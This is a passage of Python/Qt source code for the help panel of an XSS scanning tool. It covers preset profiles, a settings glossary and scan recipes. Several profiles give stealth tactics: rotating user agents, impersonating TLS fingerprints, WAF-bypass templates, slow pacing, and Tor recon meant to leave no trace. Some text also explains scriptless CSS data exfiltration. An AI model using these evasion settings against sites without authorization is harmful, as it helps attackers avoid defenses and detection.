                    ("User-Agent rotation",     "ON  every 4 req"),
                    ("Tor",                     "OFF  (bounty programs block it)"),
                    ("SSL verification",        "ON"),
                    ("Follow redirects",        "ON"),
                ]),
                ("Detection & scan vectors", [
                    ("POST forms",              "ON"),
                    ("JSON injection",          "ON"),
                    ("HTTP headers",            "ON"),
                    ("Path-segment XSS",        "OFF  (opt-in — finds path-reflected XSS query scans miss)"),
                    ("Cookie-reflected XSS",    "OFF  (opt-in — cookie value reflected unescaped)"),
                    ("DOM dynamic",             "ON"),
                    ("Context-aware payloads",  "ON"),
                    ("Stored XSS",              "WARN  off (safer default)"),
                    ("Blind XSS",               "WARN  off (safer default)"),
                    ("postMessage XSS",         "ON"),
                    ("WebSocket XSS",           "ON"),
                    ("DOM v6 taint  (Chromium runtime)", "ON  (per-param canary, source/sink)"),
                    ("Static JS  (esprima AST)", "ON  (fast ms/file, no runtime)"),
                    ("Headless verify",         "OFF  (expensive ~600ms/finding on bounty)"),
                    ("Trusted Types  (CSP+policy audit)", "ON  (offline, finds 2026 backdoors)"),
                    ("Stored round-trip  (multi-canary)", "ON  (multi-canary, finds stored XSS other scanners can't)"),
                    ("Proto Pollution  (PP→XSS chain, DOMPurify CVE feed)", "ON  (DOMPurify CVE feed + general PP→XSS chains, ~ms/page offline)"),
                    ("DOM Clobbering  (Intigriti 2026 sanitizer+sink chain)", "ON  (Intigriti 2026 mainstream attack, ~ms/page offline)"),
                    ("SSR Hydration  (CVE-2026-27902 Svelte 5 + general SSR)", "ON  (CVE-2026-27902 + general SSR injection, ~ms/page offline)"),
                    ("CSP Bypass  (94.72%% policies bypassable, Tranco 50k 2023)", "ON  (94.72%% policies bypassable — biggest gap, ~ms/page)"),
                    ("Adaptive WAF Bypass  (25 templates, per-WAF tested 2024-2026)", "ON  (25 templates 2024-2026 bug bounty research, ~ms/page)"),
                    ("Fuzzer",                  "OFF  (too many requests = bounty risk)"),
                    ("Marker parameter",        "ON"),
                    ("Fast scan (smart payloads)", "OFF  (bounty wants full payload depth, not speed)"),
                ]),
                ("Performance", [
                    ("Threads",                 "15"),
                    ("Sleep between req",       "0.05s"),
                    ("Timeout",                 "8s"),
                    ("Crawler depth",           "2"),
                    ("Max pages",               "200"),
                    ("Verbose",                 "OFF"),
                ]),
            ],
            apply_fn=lambda: self._apply_preset_bounty(),
        ))

        # ── Profile 2: Cloudflare/Akamai WAF ──
        v.addWidget(self._make_help_card(
            title="Cloudflare  /  Akamai  /  Imperva  WAF target",
            color="#3b82f6",
            when="The target is protected by an enterprise WAF. A normal scan gets you "
                 "blocked within <100 requests. You need maximum stealth — a slow "
                 "rhythm, minimal requests, aggressive vectors disabled.",
            config_sections=[
                ("Anti-detection (critical)", [
                    ("User-Agent rotation",     "ON  every 3 req (rotate a lot)"),
                    ("Tor",                     "OFF  (WAF blocks Tor exit nodes)"),
                    ("SSL verification",        "ON"),
                    ("Follow redirects",        "OFF"),
                ]),
                ("Detection & scan vectors", [
                    ("POST forms",              "OFF  (more requests = instant block)"),
                    ("JSON injection",          "OFF"),
                    ("HTTP headers",            "OFF"),
                    ("DOM dynamic",             "OFF"),
                    ("Context-aware payloads",  "ON  (reduces the number of requests)"),
                    ("Stored XSS",              "OFF"),
                    ("Blind XSS",               "OFF"),
                    ("postMessage XSS",         "OFF"),
                    ("WebSocket XSS",           "OFF"),
                    ("DOM v6 taint  (Chromium runtime)", "ON  (1 req/page via browser, different fingerprint)"),
                    ("Static JS  (esprima AST)", "ON  (offline, doesn't hit the WAF)"),
                    ("Headless verify",         "ON  (definitive confirm for few findings)"),
                    ("Trusted Types  (CSP+policy audit)", "ON  (offline, documentation for the report)"),
                    ("Stored round-trip  (multi-canary)", "OFF  (re-crawl would raise traffic, detection risk)"),
                    ("Proto Pollution  (PP→XSS chain, DOMPurify CVE feed)", "ON  (offline AST, doesn't hit the WAF, documentation for the report)"),
                    ("DOM Clobbering  (Intigriti 2026 sanitizer+sink chain)", "ON  (offline AST, sanitizer config audit, no WAF interaction)"),
                    ("SSR Hydration  (CVE-2026-27902 Svelte 5 + general SSR)", "ON  (offline regex/text scan, no WAF interaction)"),
                    ("CSP Bypass  (94.72%% policies bypassable, Tranco 50k 2023)", "ON  (offline regex/string scan, 1 extra fetch for nonce check)"),
                    ("Adaptive WAF Bypass  (25 templates, per-WAF tested 2024-2026)", "ON  (per-WAF templates incl. Akamai HoneyPie bypasses)"),
                    ("Fuzzer",                  "OFF  (MUST be disabled)"),
                    ("Marker parameter",        "ON"),
                    ("Fast scan (smart payloads)", "OFF  (full payload set to maximize WAF-bypass coverage)"),
                ]),
                ("Performance (critical — go slow!)", [
                    ("Threads",                 "4  (low)"),
                    ("Sleep between req",       "0.4s"),
                    ("Timeout",                 "15s"),
                    ("URL limit",               "80  (split the scan into multiple runs)"),
                    ("Crawler depth",           "1"),
                    ("Max pages",               "50"),
                ]),
            ],
            apply_fn=lambda: self._apply_preset_waf(),
        ))

        # ── Profile 3: Fast internal ──
        v.addWidget(self._make_help_card(
            title="Fast internal  /  your own application",
            color="#f59e0b",
            when="You're testing your own/internal application without a WAF (staging, "
                 "dev, localhost). You want maximum speed and full coverage without "
                 "worrying about detection.",
            config_sections=[
                ("Anti-detection (not needed)", [
                    ("User-Agent rotation",     "OFF  (not needed, slows things down)"),
                    ("Tor",                     "OFF"),
                    ("SSL verification",        "OFF  (self-signed certs)"),
                    ("Follow redirects",        "ON"),
                ]),
                ("Detection & scan vectors (everything)", [
                    ("POST forms",              "ON"),
                    ("JSON injection",          "ON"),
                    ("HTTP headers",            "ON"),
                    ("DOM dynamic",             "ON"),
                    ("Context-aware payloads",  "ON"),
                    ("Stored XSS",              "ON"),
                    ("Blind XSS",               "OFF  (requires an OOB URL)"),
                    ("postMessage XSS",         "ON"),
                    ("WebSocket XSS",           "ON"),
                    ("DOM v6 taint  (Chromium runtime)", "OFF  (expensive on a fast scan)"),
                    ("Static JS  (esprima AST)", "ON  (fast, no runtime)"),
                    ("Headless verify",         "OFF"),
                    ("Trusted Types  (CSP+policy audit)", "ON  (offline, ms/page)"),
                    ("Stored round-trip  (multi-canary)", "OFF  (internal scan, stored is not top priority)"),
                    ("Proto Pollution  (PP→XSS chain, DOMPurify CVE feed)", "ON  (offline ms/page, no runtime overhead)"),
                    ("DOM Clobbering  (Intigriti 2026 sanitizer+sink chain)", "ON  (offline ms/page, no runtime overhead)"),
                    ("SSR Hydration  (CVE-2026-27902 Svelte 5 + general SSR)", "ON  (offline ms/page, no runtime overhead)"),
                    ("CSP Bypass  (94.72%% policies bypassable, Tranco 50k 2023)", "ON  (offline ms/page, minimal extra requests)"),
                    ("Adaptive WAF Bypass  (25 templates, per-WAF tested 2024-2026)", "ON  (pure mutation, no extra HTTP requests)"),
                    ("Fuzzer",                  "ON"),
                    ("Marker parameter",        "ON"),
                    ("Fast scan (smart payloads)", "ON  (~18 high-signal payloads instead of full list — biggest speed lever)"),
                ]),
                ("Performance (full throttle)", [
                    ("Threads",                 "40"),
                    ("Sleep between req",       "0.01s"),
                    ("Timeout",                 "5s"),
                    ("Crawler depth",           "3"),
                    ("Max pages",               "500"),
                    ("Verbose",                 "ON"),
                ]),
            ],
            apply_fn=lambda: self._apply_preset_fast(),
        ))

        # ── Profile 4: Research/OSINT ──
        v.addWidget(self._make_help_card(
            title="Research  /  Recon  (non-attacking OSINT)",
            color="#8b5cf6",
            when="You're researching public sites with no attack intent — CSP analysis, "
                 "surface area mapping. You want to stay anonymous, polite, and leave "
                 "no trace.",
            config_sections=[
                ("Anti-detection (maximum)", [
                    ("User-Agent rotation",     "ON  every 5 req"),
                    ("Tor",                     "ON  circuit rotation every 40 req"),
                    ("SSL verification",        "ON"),
                    ("Follow redirects",        "OFF  (quiet scan)"),
                ]),
                ("Detection & scan vectors (passive)", [
                    ("POST forms",              "OFF  (leaves a trace)"),
                    ("JSON injection",          "OFF"),
                    ("HTTP headers",            "OFF"),
                    ("DOM dynamic",             "OFF"),
                    ("Context-aware payloads",  "ON  (passive detection)"),
                    ("Stored XSS",              "OFF  (you don't want to write anything)"),
                    ("Blind XSS",               "OFF"),
                    ("postMessage XSS",         "OFF"),
                    ("WebSocket XSS",           "OFF"),
                    ("DOM v6 taint  (Chromium runtime)", "OFF  (Chromium fingerprint = a trace)"),
                    ("Static JS  (esprima AST)", "ON  (purely offline analysis of downloaded JS)"),
                    ("Headless verify",         "OFF  (Chromium = a trace)"),
                    ("Trusted Types  (CSP+policy audit)", "ON  (offline, only reads downloaded content)"),
                    ("Stored round-trip  (multi-canary)", "OFF  (recon doesn't want to store data on the server)"),
                    ("Proto Pollution  (PP→XSS chain, DOMPurify CVE feed)", "ON  (purely offline, leaves no trace in telemetry)"),
                    ("DOM Clobbering  (Intigriti 2026 sanitizer+sink chain)", "ON  (purely offline, no fingerprint in telemetry)"),
                    ("SSR Hydration  (CVE-2026-27902 Svelte 5 + general SSR)", "ON  (purely offline, no fingerprint in telemetry)"),
                    ("CSP Bypass  (94.72%% policies bypassable, Tranco 50k 2023)", "ON  (purely offline analysis, low fingerprint)"),
                    ("Adaptive WAF Bypass  (25 templates, per-WAF tested 2024-2026)", "ON  (offline payload generation, low fingerprint)"),
                    ("Fuzzer",                  "OFF  (needlessly aggressive)"),
                    ("Marker parameter",        "OFF  (a trace)"),
                    ("Fast scan (smart payloads)", "OFF  (thorough full-payload scan)"),
                ]),
                ("Performance (low-and-slow)", [
                    ("Threads",                 "4"),
                    ("Sleep between req",       "0.3s"),
                    ("Timeout",                 "20s"),
                    ("URL limit",               "40"),
                    ("Crawler depth",           "1  (surface)"),
                    ("Max pages",               "50"),
                ]),
            ],
            apply_fn=lambda: self._apply_preset_recon(),
        ))

        # ── v10.59: Focus profiles — one vulnerability class each ────────────
        _focus_hdr = QLabel(
            f"<p style='color:{theme('accent_text')}; font-weight:bold; "
            f"font-size:15px; margin:18px 0 2px'>&#9656; Focus profiles "
            f"<span style='color:{theme('fg_muted')}; font-weight:normal; "
            f"font-size:12px'>— one vulnerability class each; pick when you know "
            f"what you're hunting</span></p>")
        _focus_hdr.setTextFormat(Qt.RichText); _focus_hdr.setWordWrap(True)
        v.addWidget(_focus_hdr)

        v.addWidget(self._make_help_card(
            title="DOM-based / SPA  (client-side JS sinks)",
            color="#a855f7",
            when="A JS-heavy app (React / Vue / Angular). The XSS sink lives in "
                 "client-side JavaScript, not the server response — pure HTTP "
                 "scanners walk past it.",
            config_sections=[("Enabled — everything else OFF", [
                ("DOM v6 taint  (Chromium runtime)", "ON  — per-param canary source→sink"),
                ("Static JS  (esprima AST)", "ON  — offline taint of inline+external JS"),
                ("Source-map de-minify", "ON  — recovers original source of minified bundles"),
                ("DOM dynamic", "ON"),
                ("Headless verify", "ON  — confirms real execution in Chromium"),
                ("Needs", "Playwright / Chromium. Cost ~1–2 s/page."),
            ])],
            apply_fn=lambda: self._apply_preset_dom(),
        ))

        v.addWidget(self._make_help_card(
            title="Stored / persistent XSS",
            color="#ec4899",
            when="You can submit content (comments, profile, reviews) that another "
                 "page renders. Injects a marker via POST and hunts it on OTHER "
                 "pages — including ones you can't see (blind).",
            config_sections=[("Enabled — everything else OFF", [
                ("POST forms", "ON"),
                ("Stored XSS (POST+verify)", "ON"),
                ("Stored round-trip (multi-canary)", "ON  — finds stored XSS other scanners miss"),
                ("Blind XSS (OOB)", "ON  — catches fires on admin/back-office pages"),
                ("Set in Advanced", "'Stored verify URLs' (detail/admin page) + 'Blind OOB URL'"),
            ])],
            apply_fn=lambda: self._apply_preset_stored(),
        ))

        v.addWidget(self._make_help_card(
            title="Modern-framework audit  (2026 stacks)",
            color="#14b8a6",
            when="A framework-heavy target where the bug is in client-side plumbing "
                 "(prototype pollution, DOM clobbering, Trusted-Types policy, SSR "
                 "hydration). Nearly all offline over the crawl cache — near-zero cost.",
            config_sections=[("Enabled — everything else OFF", [
                ("Proto Pollution  (PP→XSS + DOMPurify CVE)", "ON"),
                ("DOM Clobbering", "ON"),
                ("Trusted Types  (CSP + policy audit)", "ON  — finds default-policy backdoors"),
                ("SSR Hydration", "ON"),
                ("CSP Bypass", "ON"),
                ("Static JS + DOM v6", "ON  — chain confirmation"),
                ("Cost", "~ms/page offline; Mutation XSS runs automatically"),
            ])],
            apply_fn=lambda: self._apply_preset_framework(),
        ))

        v.addWidget(self._make_help_card(
            title="API / single-endpoint  (GraphQL + JSON)",
            color="#f59e0b",
            when="The attack surface is a JSON/GraphQL API, not URL params — the "
                 "surface crawl and query-string phases walk past (it lives in the "
                 "POST body / callback).",
            config_sections=[("Enabled — everything else OFF", [
                ("GraphQL reflected XSS", "ON  — read-only queries; never mutations"),
                ("JSON injection", "ON  — payloads into JSON POST bodies"),
                ("JSONP injection", "ON  — ?callback= reflected as a JS function"),
                ("POST forms", "ON"),
            ])],
            apply_fn=lambda: self._apply_preset_api(),
        ))

        v.addWidget(self._make_help_card(
            title="CSP-resistant / scriptless exfiltration",
            color="#06b6d4",
            when="A strict CSP blocks all JavaScript, so classic XSS won't fire — "
                 "but data can still leak via CSS and dangling markup. Use when the "
                 "target has a hard CSP but you still want impact.",
            config_sections=[("Enabled — everything else OFF", [
                ("CSS injection / exfil", "ON  — attribute-selector + background:url / @import"),
                ("Dangling markup", "ON  — unclosed-tag markup swallow"),
                ("SVG / XML reflection", "ON  — svg+xml direct-access execution"),
                ("Why", "all three work even when JavaScript is CSP-blocked"),
            ])],
            apply_fn=lambda: self._apply_preset_scriptless(),
        ))

        v.addWidget(self._make_help_card(
            title="Rich-text / Markdown  (CMS, wikis, comments)",
            color="#84cc16",
            when="The app renders user Markdown / rich text to HTML (wikis, issue "
                 "trackers, chat, README preview). A huge, often-overlooked surface.",
            config_sections=[("Enabled — everything else OFF", [
                ("Markdown / rich-text XSS", "ON  — js: links, raw-HTML passthrough, title breakout"),
                ("Stored XSS", "ON  — most Markdown is persisted"),
                ("POST forms", "ON"),
                ("Precision", "confirms the endpoint RENDERS Markdown before testing"),
            ])],
            apply_fn=lambda: self._apply_preset_richtext(),
        ))

        # ── Settings explained — plain-English glossary (v10.59) ────────────
        # Every switch in the Settings tab, in one line a non-expert can follow.
        # You never NEED this (profiles configure everything) — it's here for when
        # you want to understand or hand-tune.
        settings_box = QGroupBox("Settings explained — what every switch means (plain English)")
        settings_box.setObjectName("help_panel")
        settings_box.setAttribute(Qt.WA_StyledBackground, True)
        settings_box.setStyleSheet(
            f"QGroupBox#help_panel {{ color:{theme('accent_text')}; "
            f"font-weight:bold; margin-top:10px; padding-top:14px; }} "
            "QGroupBox::title { subcontrol-origin: margin; left: 12px; "
            "padding: 0 6px; }")
        settings_layout = QVBoxLayout(settings_box)
        _a = theme('accent_text'); _f = theme('fg'); _m = theme('fg_muted')

        def _grp(title):
            return (f"<p style='color:{_a}; margin:12px 0 2px; font-weight:bold'>"
                    f"&#9656; {title}</p>")

        def _row(name, desc):
            return (f"<li style='margin:0 0 5px'><b style='color:{_f}'>{name}</b> "
                    f"<span style='color:{_m}'>&mdash; {desc}</span></li>")

        settings_text = QLabel(
            f"<p style='color:{_m}; margin:0 0 4px; line-height:1.6'>"
            "You don't need to read this to scan — a profile sets it all. This is "
            "for when you're curious or want to tweak. Green = safe to leave on.</p>"

            + _grp("The basics (top of the Settings tab)")
            + f"<ul style='color:{_f}; line-height:1.6; margin:0; padding-left:18px'>"
            + _row("Target URL", "the web address you're testing. Start here.")
            + _row("Threads", "how many requests run at once. Higher = faster, but "
                   "noisier and easier to get blocked. 10&ndash;15 is a safe default.")
            + _row("Timeout", "how long to wait for one page before giving up "
                   "(seconds). Raise it for slow sites.")
            + _row("Sleep between req", "a small pause between requests to stay "
                   "polite / under the radar. Higher = slower but stealthier.")
            + _row("Crawler depth", "how many links deep to explore from the start "
                   "page. 2 is usually plenty.")
            + _row("Max pages", "a cap so a huge site doesn't run forever.")
            + "</ul>"

            + _grp("What kinds of bugs to look for")
            + f"<ul style='color:{_f}; line-height:1.6; margin:0; padding-left:18px'>"
            + _row("Context-aware payloads", "picks the right test snippet for where "
                   "your input shows up. <b style='color:#22c55e'>Leave ON.</b>")
            + _row("Reflected / POST / JSON", "input echoed straight back on the page "
                   "or via a form / API body — the classic XSS.")
            + _row("Stored XSS", "input the site SAVES and shows later (a comment, a "
                   "profile field). Found on a different page than where you typed it.")
            + _row("DOM XSS / DOM v6", "the bug is in the site's own JavaScript, not "
                   "the server. DOM v6 opens a real browser and watches your input "
                   "flow into a dangerous spot.")
            + _row("Static JS", "reads the site's JavaScript files to spot bugs "
                   "without even running them. Fast. Also catches Web/Service-Worker bugs.")
            + _row("Headless verify", "opens each suspected bug in a real Chrome to "
                   "prove it actually fires. <b>Fewer false alarms</b>, but slower.")
            + _row("postMessage / WebSocket", "bugs in the browser messaging channels "
                   "modern apps use behind the scenes.")
            + _row("Proto Pollution · DOM Clobbering · Trusted Types · SSR Hydration",
                   "modern framework weaknesses (React/Vue/Angular/Svelte). Cheap, "
                   "offline, high value on 2026 sites.")
            + _row("CSP Bypass", "checks whether the site's script-blocking policy "
                   "(its last line of defense) can be defeated.")
            + _row("GraphQL / JSONP", "bugs in API endpoints that normal URL scanning "
                   "walks past.")
            + _row("Markdown / CSS injection / Dangling / SVG", "niche but real: "
                   "rich-text fields, styling-based data theft (works even with a "
                   "strict CSP), and image/markup tricks.")
            + _row("Open redirect · Path · Cookie XSS", "other places input gets "
                   "reflected — redirect links, URL path, cookie values.")
            + "</ul>"

            + _grp("Staying under the radar (avoid getting blocked)")
            + f"<ul style='color:{_f}; line-height:1.6; margin:0; padding-left:18px'>"
            + _row("User-Agent rotation", "makes each request look like a different "
                   "normal browser.")
            + _row("TLS impersonation", "mimics a real Chrome/Firefox network "
                   "fingerprint — needed for Cloudflare/Akamai targets.")
            + _row("Adaptive WAF", "when a firewall is detected, automatically swaps "
                   "in payloads known to slip past it.")
            + _row("Scan intensity", "the overall rhythm: <i>stealth</i> = slow & "
                   "quiet, <i>fast</i> = loud & quick.")
            + _row("Tor", "routes traffic through the Tor network for anonymity "
                   "(most WAFs block Tor, so off by default).")
            + "</ul>"

            + _grp("Getting your results out")
            + f"<ul style='color:{_f}; line-height:1.6; margin:0; padding-left:18px'>"
            + _row("HTML report", "a clean, self-contained page of findings — safe to "
                   "email or attach to a ticket.")
            + _row("PoC bundle", "a ready-to-submit proof for each confirmed bug: a "
                   "one-click “Launch” + a curl command + a copy-paste writeup.")
            + _row("Evidence store", "saves every finding to a file for later triage "
                   "or tracking over time.")
            + _row("SARIF", "a standard format GitHub / GitLab read to show findings "
                   "in your CI pipeline.")
            + "</ul>"

            + f"<p style='color:#ef4444; margin:12px 0 2px; font-weight:bold'>"
            "&#9888; Dangerous — only with explicit authorization</p>"
            + f"<ul style='color:{_f}; line-height:1.6; margin:0; padding-left:18px'>"
            + _row("Destructive tests", "can CHANGE the target (cache poisoning, "
                   "password-reset abuse). Never auto-on; requires a confirmation dialog.")
            + _row("SSRF scan", "makes the server fetch URLs you choose — powerful and "
                   "intrusive. Same gating.")
            + "</ul>"
        )
        settings_text.setWordWrap(True)
        settings_text.setTextFormat(Qt.RichText)
        settings_text.setStyleSheet("padding: 2px 4px;")
        settings_layout.addWidget(settings_text)
        v.addWidget(settings_box)

        # ── Detection modules & phases reference (v10.52) ──
        # Maps every detection module to the phase label shown in LIVE OUTPUT,
        # so the operator knows what each phase is doing and how long it costs.
        # Includes the modern/2026 modules + v10.52 additions (GraphQL, source-
        # map de-minify) that the preset cards above don't spell out.
        modules_box = QGroupBox("Detection modules → phases  (what each one does)")
        modules_box.setObjectName("help_panel")
        modules_box.setAttribute(Qt.WA_StyledBackground, True)
        modules_box.setStyleSheet(
            f"QGroupBox#help_panel {{ color:{theme('accent_text')}; "
            f"font-weight:bold; margin-top:10px; padding-top:14px; }} "
            "QGroupBox::title { subcontrol-origin: margin; left: 12px; "
            "padding: 0 6px; }")
        modules_layout = QVBoxLayout(modules_box)
        _acc = theme('accent_text'); _fg = theme('fg'); _mut = theme('fg_muted')
        _new = "#22c55e"
        modules_text = QLabel(
            f"<p style='color:{_mut}; margin:0 0 8px; line-height:1.6'>"
            "Each row = a module, the <b>phase</b> name you see in LIVE OUTPUT, "
            "and what it costs. <b style='color:" + _new + "'>NEW</b> = added in "
            "v10.51/v10.52.</p>"

            f"<p style='color:{_acc}; margin:10px 0 2px; font-weight:bold'>"
            "&#9656; CLIENT-SIDE / OFFLINE  (analyse downloaded code — no extra "
            "attack traffic)</p>"
            f"<ul style='color:{_fg}; line-height:1.7; margin:0'>"
            "<li><b>Static JS</b> &rarr; phase <code>CONTEXT SCAN</code>/static — "
            "esprima AST source&rarr;sink taint of inline + external JS. Sinks incl. "
            "innerHTML / eval / <b>Worker &amp; Service Worker</b> (tainted "
            "<code>serviceWorker.register</code> / <code>new Worker</code> / "
            "<code>importScripts</code> = persistent origin compromise). ~ms/file.</li>"
            f"<li><b>Source-map de-minify</b> <b style='color:{_new}'>NEW</b> "
            "&rarr; augments Static JS — fetches a bundle's <code>.map</code> "
            "(sourcesContent), recovers the ORIGINAL source and taints THAT, so "
            "minified <code>a.innerHTML=b</code> still yields the chain. Findings "
            "show <code>origin=sourcemap</code>. Cost: 1 GET per .map.</li>"
            "<li><b>DOM v6 taint</b> &rarr; phase <code>DOM VALIDATION</code> — "
            "Chromium runtime, per-param canary source&rarr;sink. ~1 req/page.</li>"
            "<li><b>Mutation XSS, Proto Pollution, DOM Clobbering, Trusted Types, "
            "SSR Hydration, CSP Bypass</b> &rarr; phases <code>mutation_xss</code> "
            "/ <code>PROTO</code> / <code>dom-clobbering</code> / etc. — offline "
            "~ms/page, reuse the crawl HTML cache (no re-fetch).</li>"
            "</ul>"

            f"<p style='color:{_acc}; margin:12px 0 2px; font-weight:bold'>"
            "&#9656; API / NETWORK VECTORS  (opt-in — enabled by Bug-Bounty &amp; "
            "WAF presets)</p>"
            f"<ul style='color:{_fg}; line-height:1.7; margin:0'>"
            f"<li><b>GraphQL reflected XSS</b> <b style='color:{_new}'>NEW</b> "
            "&rarr; phase <code>GraphQL XSS</code> — discovers <code>/graphql</code> "
            "endpoints and probes error-message + String-variable reflection (the "
            "single-endpoint API surface crawl/query-string phases miss). "
            "Read-only: queries only, never mutations.</li>"
            "<li><b>JSONP injection</b> &rarr; phase <code>JSONP INJECTION</code> — "
            "<code>?callback=</code> reflected as a function call in a JS "
            "content-type response = XSS via &lt;script src&gt;.</li>"
            "<li><b>Dangling markup</b> &rarr; phase <code>DANGLING MARKUP</code> — "
            "unclosed-tag markup-swallow; scriptless, works even under CSP.</li>"
            "<li><b>SVG / XML reflection</b> &rarr; phase <code>SVG/XML "
            "REFLECTION</code> — reflection into image/svg+xml or application/xml "
            "that executes on direct access.</li>"
            f"<li><b>CORS misconfiguration</b> <b style='color:{_new}'>fixed</b> "
            "&rarr; phase <code>CORS (crawled pages)</code> — now scans CRAWLED "
            "endpoints (e.g. /api/*), not just the seed; ACAO-reflect + "
            "credentials = critical.</li>"
            "</ul>"

            f"<p style='color:{_acc}; margin:12px 0 2px; font-weight:bold'>"
            f"&#9656; PERFORMANCE  <b style='color:{_new}'>v10.52</b></p>"
            f"<ul style='color:{_fg}; line-height:1.7; margin:0'>"
            "<li><b>Inline param extraction</b> — parameter URLs are now harvested "
            "DURING the crawl instead of a second full re-download of every page "
            "(was ~20 min on a 370-page target &rarr; ~0 s).</li>"
            "<li><b>Crawl HTML cache</b> — mutation / postMessage / WebSocket / "
            "static-JS phases reuse the pages the crawler already fetched.</li>"
            "<li><b>Live ETA on every phase</b> — the <code>remain</code> chip "
            "now shows a countdown for each phase (or <i>estimating&hellip;</i>), "
            "never a blank.</li>"
            "</ul>"
        )
        modules_text.setWordWrap(True)
        modules_text.setTextFormat(Qt.RichText)
        modules_text.setStyleSheet("padding: 2px 4px;")
        modules_layout.addWidget(modules_text)
        v.addWidget(modules_box)

        # ── Scan recipes — goal → exact toggles (v10.59) ──
        # The 4 presets above are broad profiles; these recipes are task-focused
        # ("I want to test X → enable exactly these"), covering the individual
        # detection modules the presets don't spell out per goal.
        recipes_box = QGroupBox("Scan recipes — pick a goal, enable exactly these")
        recipes_box.setObjectName("help_panel")
        recipes_box.setAttribute(Qt.WA_StyledBackground, True)
        recipes_box.setStyleSheet(
            f"QGroupBox#help_panel {{ color:{theme('accent_text')}; "
            f"font-weight:bold; margin-top:10px; padding-top:14px; }} "
            "QGroupBox::title { subcontrol-origin: margin; left: 12px; "
            "padding: 0 6px; }")
        recipes_layout = QVBoxLayout(recipes_box)

        def _recipe(goal: str, enable: str, note: str) -> str:
            return (f"<li style='margin:0 0 7px'>"
                    f"<b style='color:{_acc}'>{goal}</b><br>"
                    f"<span style='color:{_mut}'>enable:</span> "
                    f"<b style='color:{_fg}'>{enable}</b><br>"
                    f"<span style='color:{_mut}'>{note}</span></li>")

        recipes_text = QLabel(
            f"<p style='color:{_mut}; margin:0 0 8px; line-height:1.6'>"
            "The presets are broad profiles. These are goal-focused — turn on "
            "exactly the toggles listed (leave the rest off) for a fast, "
            "low-noise scan aimed at one vulnerability class.</p>"
            f"<ul style='color:{_fg}; line-height:1.6; margin:0; padding-left:18px'>"

            + _recipe(
                "DOM-based XSS — SPA / client-side (React/Vue/Angular)",
                "DOM v6 taint &middot; Static JS &middot; Source-map de-minify "
                "&middot; DOM &middot; Headless verify",
                "The sink lives in JavaScript. DOM v6 injects a per-param canary "
                "in a real browser; Static JS + source-map recover the "
                "source&rarr;sink chain offline; Headless verify confirms exec. "
                "Needs Playwright/Chromium. Cost: ~1&ndash;2 s/page.")

            + _recipe(
                "Stored / persistent XSS (comments, profiles, admin views)",
                "Stored (POST+verify) &middot; Stored round-trip &middot; "
                "Blind XSS (OOB) &middot; Stored verify URLs &middot; Blind OOB URL",
                "Injects a marker via POST, then hunts it on OTHER pages. Put the "
                "detail/admin page in 'Stored verify URLs' (Advanced) and a "
                "collaborator URL in 'Blind OOB URL' to catch fires you can't see.")

            + _recipe(
                "Modern-framework client bugs (2026 stacks)",
                "Proto Pollution &middot; DOM Clobbering &middot; Trusted Types "
                "&middot; SSR Hydration &middot; CSP Bypass  (Mutation XSS is automatic)",
                "All offline over the crawl HTML cache (~ms/page, no extra "
                "traffic). High value on framework-heavy targets; near-zero cost.")

            + _recipe(
                "API / single-endpoint surface",
                "GraphQL reflected XSS &middot; JSON scan &middot; JSONP injection",
                "The attack surface lives in JSON POST bodies / callbacks that the "
                "URL-param phases walk past. GraphQL is read-only (queries only).")

            + _recipe(
                "CSP-resistant / scriptless exfiltration",
                "CSS injection / exfil &middot; Dangling markup &middot; SVG/XML",
                "Work even when a strict CSP blocks all JavaScript — CSS "
                "attribute-selector + background:url / @import, markup-swallow, "
                "and svg+xml direct-access execution.")

            + _recipe(
                "Rich-text / CMS / Markdown fields",
                "Markdown / rich-text XSS &middot; Stored &middot; Context-aware",
                "For apps that render user Markdown (wikis, issues, chat). Confirms "
                "the endpoint renders Markdown before testing js: links / raw-HTML.")

            + _recipe(
                "WAF / CDN target (Cloudflare, Akamai, Imperva)",
                "TLS impersonation = rotate &middot; Adaptive WAF &middot; "
                "Scan intensity = stealth &middot; low Threads &middot; Tor (optional)",
                "Or just click the WAF preset. Impersonation gives a real "
                "browser JA3/JA4 fingerprint; adaptive-WAF swaps in bypass "
                "templates when a WAF is detected.")

            + _recipe(
                "Bug-bounty submission (deliverables)",
                "HTML report &middot; PoC bundle &middot; Evidence store",
                "PoC bundle = one Launch-link/auto-submit form + curl repro + "
                "Markdown writeup per confirmed finding, ready to paste into a "
                "report. Evidence store keeps every finding for triage/drift.")

            + "</ul>"
        )
        recipes_text.setWordWrap(True)
        recipes_text.setTextFormat(Qt.RichText)
        recipes_text.setStyleSheet("padding: 2px 4px;")
        recipes_layout.addWidget(recipes_text)
        v.addWidget(recipes_box)

        # ── Common mistakes ──
        tips_box = QGroupBox("Common mistakes — what not to enable at once")
        tips_box.setStyleSheet(
            f"QGroupBox {{ color: {theme('warn_text')}; border: 1px solid {theme('warn_border')}; "
            "border-radius: 7px; margin-top: 10px; padding-top: 14px; "
            "font-weight: bold;} "
            "QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px;}"
        )
        tips_layout = QVBoxLayout(tips_box)
        tips_text = QLabel(
            "<ul style='line-height:1.7; color:#ccc'>"
            "<li><b style='color:#fff'>Tor  +  Cloudflare/Akamai target</b>  →  "
            "Tor exit nodes are on the WAF blocklist. The scan will be blocked on "
            "the very first request.</li>"
            "<li><b style='color:#fff'>Tor  +  Bug Bounty</b>  →  Most "
            "programs prohibit Tor in their rules. A report from a Tor IP gets rejected "
            "due to an unverifiable identity.</li>"
            "<li><b style='color:#fff'>Fuzzer  +  all vectors at once</b>  →  "
            "Exponential growth in requests. The fuzzer generates 200 req/param, "
            "postMessage + stored + DOM 3×. For 50 params = 30,000+ requests.</li>"
            "<li><b style='color:#fff'>Stored XSS  +  Research mode</b>  →  "
            "Stored writes a payload into the DB. In OSINT mode you don't want to leave a trace.</li>"
            "<li><b style='color:#fff'>High thread count  +  Tor</b>  →  All "
            "threads go through 1 exit node. Enable <b>Isolate circuit per worker</b> "
            "(future v1.1).</li>"
            "<li><b style='color:#fff'>Blind XSS without an OOB URL</b>  →  Blind "
            "requires a callback server (xss.hunter, Burp Collaborator). Without one "
            "it does nothing.</li>"
            "<li><b style='color:#fff'>DOM v6 + Recon mode</b>  →  DOM v6 launches "
            "a full Chromium browser. A realistic fingerprint leaves a trace in telemetry. "
            "For real recon use only <b>Static JS</b> + <b>Trusted Types</b> "
            "(both purely offline).</li>"
            "<li><b style='color:#fff'>Headless verify without DOM v6/Static JS</b>  →  "
            "The headless verifier confirms HIGH-confidence findings from the other phases. "
